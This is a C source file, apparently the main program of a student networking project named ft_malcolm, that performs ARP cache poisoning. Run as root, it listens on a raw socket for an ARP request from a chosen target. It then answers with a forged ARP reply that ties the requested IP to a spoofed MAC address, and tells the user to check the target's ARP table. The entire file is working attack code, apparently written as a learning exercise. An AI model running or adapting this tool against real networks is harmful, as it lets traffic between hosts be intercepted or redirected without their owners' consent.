#include "ft_malcolm.h"

static volatile sig_atomic_t running;

void signal_handler(const int signal) {
    if (SIGINT == signal) {
        printf("Signal received: SIGINT\n");
        running = 0;
    }
}

int main (const int argc, char **argv) {
    const char *source_ip = argv[1];
    const char *source_spoofed_mac_address = argv[2];
    const char *target_ip = argv[3];
    const char *target_mac_address = argv[4];
    int s;
    running = 1;

    struct sigaction sa = {0};
    sa.sa_handler = signal_handler;
    sigaction(SIGINT, &sa, NULL);

    if (getuid() != 0) {
        fprintf(stderr, "This program must be run as root\n");
        return 1;
    }

    if (!valid_arguments(argc, argv)) {
        return 1;
    }

    if ((s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        fprintf(stderr, "Error: could not open socket\n");
        return 1;
    }

    // Wait for incoming packet...
    while (running) {
        union etherframe frame;
        const ssize_t rec = recvfrom(s, frame.full_frame, FRAME_LEN, 0, NULL, NULL);
        if (rec == -1) {
            if (errno == EINTR) {
                fprintf(stderr, "recvfrom system call has been interrupted by a signal\n");
                continue;
            }
            printf("Error while receiving packets: %s\n", strerror(errno));
        }
        else if (ntohs(frame.field.header.ether_type) == ETH_P_ARP &&
            is_equal_mac(frame.field.header.ether_shost, target_mac_address) &&
            is_equal_ip(frame.field.arp.arp_spa, target_ip) &&
            is_equal_ip(frame.field.arp.arp_tpa, source_ip)) {

            print_arp_request(target_ip, target_mac_address);

            // ARP Packet preparation
            frame.field.arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
            ft_memcpy(frame.field.arp.arp_tha, frame.field.arp.arp_sha,  ETH_ALEN);
            spoof_arp_mac_addr(frame.field.arp.arp_sha, source_spoofed_mac_address); // Spoof source Mac Address
            // Switch IP Addresses in ARP packet
            uint8_t buf_1[sizeof(frame.field.arp.arp_spa)];
            ft_memcpy(buf_1, frame.field.arp.arp_spa, sizeof(buf_1));
            ft_memcpy(frame.field.arp.arp_spa, frame.field.arp.arp_tpa, sizeof(frame.field.arp.arp_spa));
            ft_memcpy(frame.field.arp.arp_tpa, buf_1, sizeof(frame.field.arp.arp_tpa));

            // Switch destination and source values in the ethernet header
            ft_memcpy(frame.field.header.ether_dhost, frame.field.header.ether_shost, ETH_ALEN);
            ft_memcpy(frame.field.header.ether_shost, frame.field.arp.arp_sha, ETH_ALEN);

            // Setup sockaddr structure for the network device
            struct sockaddr_ll device = {0};
            device.sll_ifindex = if_nametoindex(NETWORK_ADAPTER);
            device.sll_family = AF_PACKET;
            ft_memcpy(device.sll_addr, frame.field.arp.arp_sha, ETH_ALEN);
            device.sll_halen = htons(ETH_ALEN);

            // Send ARP Packet
            printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
            if (sendto(s, frame.full_frame, FRAME_LEN, 0, (struct sockaddr *) &device, sizeof(device)) > 0)
                printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
            else
                printf("Error, ARP reply packet could not be sent : %s\n", strerror(errno));
            running = 0;
        }
    }
    close(s);
    printf("Exiting program...\n");
    return 0;
}
